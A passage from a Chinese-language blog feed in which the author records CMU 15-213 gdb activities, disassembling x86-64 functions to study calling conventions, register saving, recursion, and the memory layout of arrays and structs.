$0x0,%eax\n   0x000000000040117b &lt;+41&gt;:    callq  0x401050 &lt;printf@plt&gt;\n   0x0000000000401180 &lt;+46&gt;:    add    $0x8,%rsp\n   0x0000000000401184 &lt;+50&gt;:    retq\nEnd of assembler dump.\n</code></pre>\n<p>第一个传入的参数保存在 <code>%edi</code>  中，其值是 <code>0x402016</code> 。估摸着是 <code>int</code>  类型。输入 <code>x/s 0x402016</code> ，显示：</p>\n<pre><code>(gdb) x/s 0x402016\n0x402016:       &quot;%d %d %d %d %d&quot;\n</code></pre>\n<p>确实是 <code>int</code>  类型，那么此处猜测 <code>x/s</code>  是打印从该处开始的字符串。</p>\n<p>输入 <code>c</code> ，提示如下：</p>\n<pre><code>(gdb) c\nContinuing.\n\nNow disassemble the function seeMoreArgs.\nIt calls printf with eight arguments.\nBased on what you see in the disasssembly, answer Problem 7.\nWhen you are finished, 'c'ontinue.\n\n\nProgram received signal SIGTRAP, Trace/breakpoint trap.\nmain (argc=&lt;optimized out&gt;, argv=&lt;optimized out&gt;) at machine-procedures/locals.c:156\n</code></pre>\n<p>输入 <code>disassemble seeMoreArgs</code> ，输出如下：</p>\n<pre><code>(gdb) disassemble seeMoreArgs\nDump of assembler code for function seeMoreArgs:\n   0x0000000000401185 &lt;+0&gt;:     sub    $0x8,%rsp\n   0x0000000000401189 &lt;+4&gt;:     pushq  $0x8\n   0x000000000040118b &lt;+6&gt;:     pushq  $0x7\n   0x000000000040118d &lt;+8&gt;:     mov    $0x6,%r9d\n   0x0000000000401193 &lt;+14&gt;:    mov    $0x5,%r8d\n   0x0000000000401199 &lt;+20&gt;:    mov    $0x4,%ecx\n   0x000000000040119e &lt;+25&gt;:    mov    $0x3,%edx\n   0x00000000004011a3 &lt;+30&gt;:    mov    $0x2,%esi\n   0x00000000004011a8 &lt;+35&gt;:    mov    $0x402010,%edi\n   0x00000000004011ad &lt;+40&gt;:    mov    $0x0,%eax\n   0x00000000004011b2 &lt;+45&gt;:    callq  0x401050 &lt;printf@plt&gt;\n   0x00000000004011b7 &lt;+50&gt;:    add    $0x18,%rsp\n   0x00000000004011bb &lt;+54&gt;:    retq\nEnd of assembler dump.\n</code></pre>\n<p>第 7 个和第 8 个被压在栈上。寄存器只有 6 个，多的就压在栈上。</p>\n<p>输入 <code>c</code> ，提示如下：</p>\n<pre><code>(gdb) c\nContinuing.\n\nThe stack can also be used to store local variables.\n\nNow disassemble the function getV.\nIt contains a local array of 4 ints.\n(The compiler has chosen to reserve some extra stack space.)\nBased on what you see in the disasssembly, answer Problems 7 and 8.\nWhen you are finished, 'c'ontinue.\n\n\nProgram received signal SIGTRAP, Trace/breakpoint trap.\nmain (argc=&lt;optimized out&gt;, argv=&lt;optimized out&gt;) at machine-procedures/locals.c:156\n</code></pre>\n<p>输入 <code>disassemble getV</code> ，结果如下：</p>\n<pre><code>(gdb) disassemble getV\nDump of assembler code for function getV:\n   0x00000000004011bc &lt;+0&gt;:     sub    $0x18,%rsp\n   0x00000000004011c0 &lt;+4&gt;:     movslq %edi,%rsi\n   0x00000000004011c3 &lt;+7&gt;:     mov    %rsp,%rdi\n   0x00000000004011c6 &lt;+10&gt;:    callq  0x401284 &lt;getValue&gt;\n   0x00000000004011cb &lt;+15&gt;:    add    $0x18,%rsp\n   0x00000000004011cf &lt;+19&gt;:    retq\nEnd of assembler dump.\n</code></pre>\n<p><code>getV</code>  的调用过程如下：</p>\n<ol>\n<li><code>%rsp - 24</code> ，留出 24 个字节的位置</li>\n<li><code>%rsi = %edi, %rdi = %rsp</code> <br>\n 将 <code>%rsp</code>  的位置通过 <code>%rdi</code>  传入。 <code>%rsp</code>  指向数组的起始位置。</li>\n</ol>\n<p>对 <code>getValue</code>  进行反汇编结果如下：</p>\n<pre><code>(gdb) disassemble getValue\nDump of assembler code for function getValue:\n   0x0000000000401284 &lt;+0&gt;:     mov    (%rdi,%rsi,4),%eax\n   0x0000000000401287 &lt;+3&gt;:     retq\nEnd of assembler dump.\n</code></pre>\n<p>输入 <code>c</code>  继续，结果如下：</p>\n<pre><code>(gdb) c\nContinuing.\n\nThere are also rules for whether a function is allowed to change\nthe value in each register--all the registers, not just those\nused for arguments.\n\nEach register is either call-preserved or call-clobbered.\nWhen a function returns, all the call-preserved registers must\nhave the same values that they did when the function was called.\nThat means, if a function wants to use a call-preserved register,\nit must save the old value first, and restore it when it's done using\nthe register. (The push and pop instructions are often used for this.)\n\n(More text to follow, 'c'ontinue to go on...)\n\n\nProgram received signal SIGTRAP, Trace/breakpoint trap.\nmain (argc=&lt;optimized out&gt;, argv=&lt;optimized out&gt;) at machine-procedures/locals.c:156\n</code></pre>\n<p>继续输入 <code>c</code> ，提示如下：</p>\n<pre><code>(gdb) c\nContinuing.\n\n... The call-clobbered registers, on the other hand, don't have to be\nsaved and restored. A function that wants to use them can just use\nthem, without worrying about whether its callers were using them also.\nHowever, if a function has an important value in a call-clobbered\nregister, and it needs to call some other function, and then use that\nimportant value afterward, it has to save the value itself!\n\n(Some people use the term 'callee-save' instead of 'call-preserved',\nand 'caller-save' instead of 'call-clobbered'. We don't like those\nterms because there's only one letter of difference between them.)\n\nDisassemble the function mult4 and think about how it is using the registers.\nUsing what you find, answer Problem 9. When you are finished, 'c'ontinue.\n\n\nProgram received signal SIGTRAP, Trace/breakpoint trap.\nmain (argc=&lt;optimized out&gt;, argv=&lt;optimized out&gt;) at machine-procedures/locals.c:156\n156     in machine-procedures/locals.c\n</code></pre>\n<p>本段提示主要讲了 <code>caller saved registers</code>  的概念。</p>\n<p><code>caller saved registers</code>  (我个人觉得更准确的说法是 <code>caller preserver &amp; restore</code> )，例如下列的过程调用（写的比较粗糙）：</p>\n<pre><code class=\"language-asm\">call_echo:\n    pushq %rbx\n    callq echo&lt;xxxx&gt;\n    popq %rbx\n    ret\n\necho:\n    %rbx += 1\n    call printf&lt;xxxx&gt;\n    ret\n</code></pre>\n<p>在 <code>echo</code>  的过程中会修改 <code>%rbx</code>  的值，那么在对其进行调用前就必须 <code>pushq %rbx</code> ，并且在调用完后 <code>popq %rbx</code> 。</p>\n<p>输入 <code>disassemble mult4</code>  可得如下结果：</p>\n<pre><code>(gdb) disassemble mult4\nDump of assembler code for function mult4:\n   0x0000000000401250 &lt;+0&gt;:     push   %rbx\n   0x0000000000401251 &lt;+1&gt;:     push   %r12\n   0x0000000000401253 &lt;+3&gt;:     push   %r13\n   0x0000000000401255 &lt;+5&gt;:     mov    %edx,%r12d\n   0x0000000000401258 &lt;+8&gt;:     mov    %ecx,%r13d\n   0x000000000040125b &lt;+11&gt;:    callq  0x40124a &lt;mult2&gt;\n   0x0000000000401260 &lt;+16&gt;:    mov    %r12d,%edi\n   0x0000000000401263 &lt;+19&gt;:    mov    %r13d,%esi\n   0x0000000000401266 &lt;+22&gt;:    mov    %eax,%ebx\n   0x0000000000401268 &lt;+24&gt;:    callq  0x40124a &lt;mult2&gt;\n   0x000000000040126d &lt;+29&gt;:    mov    %eax,%edi\n   0x000000000040126f &lt;+31&gt;:    mov    %ebx,%esi\n   0x0000000000401271 &lt;+33&gt;:    callq  0x40124a &lt;mult2&gt;\n   0x0000000000401276 &lt;+38&gt;:    pop    %r13\n   0x0000000000401278 &lt;+40&gt;:    pop    %r12\n   0x000000000040127a &lt;+42&gt;:    pop    %rbx\n   0x000000000040127b &lt;+43&gt;:    retq\nEnd of assembler dump.\n</code></pre>\n<p>然后 <code>disassemble mult2</code> ，结果如下：</p>\n<pre><code>(gdb) disassemble mult2\nDump of assembler code for function mult2:\n   0x000000000040124a &lt;+0&gt;:     mov    %edi,%eax\n   0x000000000040124c &lt;+2&gt;:     imul   %esi,%eax\n   0x000000000040124f &lt;+5&gt;:     retq\nEnd of assembler dump.\n</code></pre>\n<p>可以看到 <code>mult2</code>  函数中主要使用到的是 <code>%edi</code>  和 <code>%esi</code>  两个寄存器。返回值在 <code>%eax</code>  中。在 <code>mult4</code>  中，压入了 <code>%rbx %r12 %r13</code> 。</p>\n<p>输入 <code>c</code> ，提示如下：</p>\n<pre><code>(gdb) c\nContinuing.\n\nFor the final step in today's activity, we will look at recursive\ncalls. Each recursive invocation of a function has its own space on\nthe stack, separate from any other call's space.\n\nDisassemble the function mrec and think about what it does.\nAnswer Problem 10. When you are finished, 'c'ontinue.\n\n\nProgram received signal SIGTRAP, Trace/breakpoint trap.\nmain (argc=&lt;optimized out&gt;, argv=&lt;optimized out&gt;) at machine-procedures/locals.c:156\n</code></pre>\n<p>输入 <code>disassemble mrec</code> ，得到如下结果：</p>\n<pre><code>(gdb) disassemble mrec\nDump of assembler code for function mrec:\n   0x00000000004011d0 &lt;+0&gt;:     push   %rbx\n   0x00000000004011d1 &lt;+1&gt;:     mov    %edi,%ebx\n   0x00000000004011d3 &lt;+3&gt;:     cmp    $0x1,%edi\n   0x00000000004011d6 &lt;+6&gt;:     je     0x4011e5 &lt;mrec+21&gt;\n   0x00000000004011d8 &lt;+8&gt;:     lea    -0x1(%rdi),%edi\n   0x00000000004011db &lt;+11&gt;:    callq  0x4011d0 &lt;mrec&gt;\n   0x00000000004011e0 &lt;+16&gt;:    imul   %ebx,%eax\n   0x00000000004011e3 &lt;+19&gt;:    pop    %rbx\n   0x00000000004011e4 &lt;+20&gt;:    retq\n   0x00000000004011e5 &lt;+21&gt;:    mov    %edi,%eax\n   0x00000000004011e7 &lt;+23&gt;:    jmp    0x4011e3 &lt;mrec+19&gt;\nEnd of assembler dump.\n</code></pre>\n<p>将该函数转化为 C 函数，如下：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// arg in %rbx</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">mrec</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token operator\">*</span> rbx<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token comment\">//int* temp = rbx; // 保存 % rbx</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    ebx <span class=\"token operator\">=</span> edi<span class=\"token punctuation\">;</span> <span class=\"token comment\">//rbx 重新赋值</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>edi <span class=\"token operator\">==</span> <span class=\"token number\">0x1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        eax <span class=\"token operator\">=</span> edi<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 返回值 = edi</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token comment\">//rbx = temp; // 获得 rbx 原值</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">return</span> eax<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    edi <span class=\"token operator\">=</span> rdi <span class=\"token operator\">-</span> <span class=\"token number\">0x1</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// edi -= 1</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">int</span> eax <span class=\"token operator\">=</span> <span class=\"token function\">mrec</span><span class=\"token punctuation\">(</span>rbx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 获得返回值</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    eax <span class=\"token operator\">*=</span> ebx<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 返回值 * ebx</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token comment\">//rbx = temp; // 获得 rbx 原值</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">return</span> eax<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\">// 一个更加 C 的版本</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">mrec</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> x<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>x <span class=\"token operator\">==</span> <span class=\"token number\">0x1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">return</span> x<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">return</span> x <span class=\"token operator\">*</span> <span class=\"token function\">mrec</span><span class=\"token punctuation\">(</span>x<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>推测该函数实现了 <code>x</code>  的阶乘？</p>\n<h2 id=\"activity-3\"><a class=\"markdownIt-Anchor\" href=\"#activity-3\">#</a> Activity 3</h2>\n<p>重新运行 <code>gdb -args ./calls</code> ，运行到 <code>showStack</code>  处，打印 <code>$rip</code>  前 3 个字节，得到如下结果：</p>\n<pre><code>(gdb) x/3b $rsp\n0x7fffffffdde0: 0x13    0x52    0x01\n</code></pre>\n<p>可以看到数字 <code>0x15213</code>  的高位存放在高字节中，低位存放在低字节中，该机器使用的是小端法。</p>\n",
            "tags": []
        },
        {
            "id": "https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Activity/Machine%20data%20activity/",
            "url": "https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Activity/Machine%20data%20activity/",
            "title": "15-213 Machine Data Activity 记录",
            "date_published": "2024-02-29T09:15:08.000Z",
            "content_html": "<p>输入 <code>gdb ./data-layout</code> ，开启 <code>Data activity</code>  之旅。</p>\n<h2 id=\"integers-and-local-variables\"><a class=\"markdownIt-Anchor\" href=\"#integers-and-local-variables\">#</a> Integers and Local Variables</h2>\n<p><code>returnOne</code>  的 C 语言版本如下：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">returnOne</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">int</span> local <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token function\">abs</span><span class=\"token punctuation\">(</span>local<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>输入 <code>disassemble returnOne</code> ，得到如下结果：</p>\n<pre><code>(gdb) disassemble returnOne\nDump of assembler code for function returnOne:\n   0x0000000000400581 &lt;+0&gt;:     sub    $0x8,%rsp\n   0x0000000000400585 &lt;+4&gt;:     mov    $0xffffffff,%edi\n   0x000000000040058a &lt;+9&gt;:     callq  0x400613 &lt;abs&gt;\n   0x000000000040058f &lt;+14&gt;:    add    $0x8,%rsp\n   0x0000000000400593 &lt;+18&gt;:    retq\nEnd of assembler dump.\n</code></pre>\n<p>可以看到首先我们为 <code>returnOne</code>  预留了 8 个字节的栈空间。将 <code>0xffffffff</code>  放入 <code>%edi</code> （应该是传入函数的第一个参数寄存器）。然后调用 <code>abs</code> ，最后还原栈空间。</p>\n<p>对 <code>abs</code>  进行反汇编结果如下：</p>\n<pre><code>(gdb) disassemble abs\nDump of assembler code for function abs:\n   0x0000000000400613 &lt;+0&gt;:     mov    %edi,%edx\n   0x0000000000400615 &lt;+2&gt;:     sar    $0x1f,%edx\n   0x0000000000400618 &lt;+5&gt;:     mov    %edi,%eax\n   0x000000000040061a &lt;+7&gt;:     xor    %edx,%eax\n   0x000000000040061c &lt;+9&gt;:     sub    %edx,%eax\n   0x000000000040061e &lt;+11&gt;:    retq\nEnd of assembler dump.\n</code></pre>\n<p><code>abs</code>  所做的是把 <code>%edi</code>  放入 <code>%edx</code> ，然后将其右移 31 位（也就是让符号位充满），将其和原值相异或，然后再减去全符号位。最后返回 <code>%eax</code> 。此处 <code>local</code>  变量应该是存储在寄存器 <code>%edi</code>  中。这里的问题是如果 <code>local</code>  不在栈上，那么我们就没有办法获取它的地址。如果需要 <code>local</code>  的地址的话，我们可能需要将其压在栈上，然后使用 <code>leaq %rsp, %rdi</code>  获取它的地址。</p>\n<p>为了验证我们的结论，我们对 <code>returnOneTwo</code>  进行反汇编：</p>\n<pre><code>(gdb) disassemble returnOneTwo\nDump of assembler code for function returnOneTwo:\n   0x0000000000400594 &lt;+0&gt;:     sub    $0x18,%rsp\n   0x0000000000400598 &lt;+4&gt;:     movl   $0xffffffff,0xc(%rsp)\n   0x00000000004005a0 &lt;+12&gt;:    lea    0xc(%rsp),%rdi\n   0x00000000004005a5 &lt;+17&gt;:    callq  0x40061f &lt;absp&gt;\n   0x00000000004005aa &lt;+22&gt;:    add    $0x18,%rsp\n   0x00000000004005ae &lt;+26&gt;:    retq\nEnd of assembler dump.\n</code></pre>\n<p>该函数所做的是预留 24 个字节的空间，然后把 <code>0xffffffff</code>  放入 <code>M[%rsp + 12]</code>  的位置上，并且将指向该位置的指针赋给 <code>%rdi</code> ，随后调用 <code>absp</code> 。由此推测， <code>absp</code>  的传入参数是一个指针（ <code>%rdi</code>  中）。调用完成后恢复栈空间。</p>\n<p>因此， <code>absp</code>  的函数原型应该是 <code>int absp(int* p)</code> 。</p>\n<h2 id=\"arrays\"><a class=\"markdownIt-Anchor\" href=\"#arrays\">#</a> Arrays</h2>\n<p><code>x</code>  的几种不同格式的显示<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC81ODkzMDhkZDM2ZGM=\">见此</span>。这里的显示需要指明 3 个内容：</p>\n<ol>\n<li>显示几个单位</li>\n<li>每个单位几个字节：如 b=1 byte, h=2 bytes,w=4 bytes,g=8 bytes（如果不指定，默认 1 字节）</li>\n<li>用几进制显示： <code>b</code>  就是 2 进制， <code>x</code>  就是 16 进制， <code>d</code>  就是 10 进制</li>\n</ol>\n<p>使用 <code>x/4b courses</code>  只能查看 4 个字节，以 10 进制数显示，结果如下：</p>\n<pre><code>(gdb) x/4b courses\n0x601110 &lt;courses&gt;:     19      82      1       0\n</code></pre>\n<p>使用 <code>x/4x courses</code>  只能查看 4 个字节，以 16 进制数显示，结果如下：</p>\n<pre><code>(gdb) x/4x courses\n0x601110 &lt;courses&gt;:     0x13    0x52    0x01    0x00\n</code></pre>\n<p>使用 <code>x/4wx courses</code>  查看 <code>courses</code>  处的 4 个 <code>int</code>  类型值。 <code>w</code>  是 4 个字节。结果如下：</p>\n<pre><code>(gdb) x/4wx courses\n0x601110 &lt;courses&gt;:     0x00015213      0x00015513      0x00018213      0x00018600\n</code></pre>\n<p>可以看到 <code>courses</code>  处存放了 4 个值：15213 15513 18213 18600，对应数组中的 4 个元素。</p>\n<p><code>getNth</code>  函数的 C 语言形式如下：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">getNth</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>arr <span class=\"token punctuation\">,</span> <span class=\"token class-name\">size_t</span> index<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">return</span> arr<span class=\"token punctuation\">[</span>index<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>其中 <code>%rdi</code>  是数组的起始位置 ( <code>arr</code> )， <code>%rsi</code>  是索引 ( <code>index</code> )。因为一个 <code>int</code>  类型是 4 个字节，因此计算地址的时候是 <code>*(rdi + 4 * rsi)</code></p>\n<p>对 <code>getNth</code>  函数进行反汇编可得：</p>\n<pre><code>(gdb) disassemble getNth\nDump of assembler code for function getNth:\n   0x00000000004005af &lt;+0&gt;:     mov    (%rdi,%rsi,4),%eax\n   0x00000000004005b2 &lt;+3&gt;:     retq\nEnd of assembler dump.\n</code></pre>\n<p>重新运行，输入一次 <code>c</code> ，输入 <code>x/bx $rdi</code>  可得：</p>\n<pre><code>(gdb) x/s $rdi\n0x4007f8:       &quot;15213 CSAPP&quot;\n</code></pre>\n<p>此处的字符串是 <code>15213 CSAPP</code> 。（推测 <code>x/s $rdi</code>  的意思以字符串的形式打印从 <code>$rdi</code>  开始的内存）。输入 <code>x/12bx $rdi</code> ，可以得到如下结果：</p>\n<pre><code>(gdb) x/12bx $rdi\n0x4007f8:       0x31    0x35    0x32    0x31    0x33    0x20    0x43    0x53\n0x400800:       0x41    0x50    0x50    0x00\n</code></pre>\n<p>字符串的结尾是 <code>0x00</code> ， <code>x/s</code>  命令应该是通过 <code>0x00</code>  判断字符串的结尾，进而计算字符串的长度的。</p>\n<h2 id=\"structs\"><a class=\"markdownIt-Anchor\" href=\"#structs\">#</a> Structs</h2>\n<p>定义 <code>struct course</code>  如下：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">course</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">int</span> cs_ugrad<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">int</span> cs_grad<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">int</span> ece_ugrad <span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">int</span> ece_grad<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>继续输入 <code>c</code> ，handout 提示断点处的函数将 <code>struct course</code>  结构的值作为传入参数，使用 <code> x/4wx $rdi</code>  查看 <code>%rdi</code>  处的内存可以看到：</p>\n<pre><code>(gdb) x/4wx $rdi\n0x601100 &lt;course&gt;:      0x00015213      0x00015513      0x00018213      0x00018600\n</code></pre>\n<p>我们可以发现该处的四个值就是： <code>0x15213 0x15513 0x18213 0x18600</code></p>\n<p>我们定义结构体：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">increasing</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">char</span> a<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">short</span> b<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">int</span> c<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">long</span> d<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>假设</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>a <span class=\"token operator\">=</span> <span class=\"token number\">0x0a</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>b <span class=\"token operator\">=</span> <span class=\"token number\">0x0b0b</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token number\">0x0c0c0c0c</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>d <span class=\"token operator\">=</span> <span class=\"token number\">0x0d0d0d0d0d0d0d0d</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>继续输入 <code>c</code> ，我们使用 <code>x/32bx $rdi</code>  来查看结构体内容，内容如下：</p>\n<pre><code>(gdb) x/32bx $rdi\n0x6010e0 &lt;increasing&gt;:  0x0a    0x00    0x0b    0x0b    0x0c    0x0c    0x0c    0x0c\n0x6010e8 &lt;increasing+8&gt;:        0x0d    0x0d    0x0d    0x0d    0x0d    0x0d    0x0d    0x0d\n0x6010f0 &lt;increasing+16&gt;:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00\n0x6010f8 &lt;increasing+24&gt;:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00\n</code></pre>\n<p>和我们料想的情况一致。</p>\n<p>将结构体内容重新排列如下：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">rearranged</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">char</span> a<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">long</span> b<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">short</span> c<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">int</span> d<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这种方法按理论来说应该比上面那种多用 8 个字节。结果验证如下：</p>\n<pre><code>(gdb) x/32bx rearranged\n0x6010a0 &lt;rearranged&gt;:  0x0a    0x00    0x00    0x00    0x00    0x00    0x00    0x00\n0x6010a8 &lt;rearranged+8&gt;:        0x0b    0x0b    0x0b    0x0b    0x0b    0x0b    0x0b    0x0b\n0x6010b0 &lt;rearranged+16&gt;:       0x0c    0x0c    0x00    0x00    0x0d    0x0d    0x0d    0x0d\n0x6010b8 &lt;rearranged+24&gt;:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00\n</code></pre>\n<h2 id=\"arrays-of-structs\"><a class=\"markdownIt-Anchor\" href=\"#arrays-of-structs\">#</a> Arrays of Structs</h2>\n<p>有结构体如下：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">pair</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">int</span> large<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">char</span> small<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">pair</span> pairs <span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span> xabababab <span class=\"token punctuation\">,</span> <span class=\"token number\">0x1</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span> xcdcdcdcd <span class=\"token punctuation\">,</span> <span class=\"token number\">0x2</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>每个 <code>pair</code>  应该是 8 个字节。因为 <code>int</code>  类型占 4 个字节， <code>char</code>  类型占 1 个字节。<strong>此外结构体的长度必须是结构体中体积最大的类型的整数倍</strong>，该结构体中最大的是 <code>int</code>  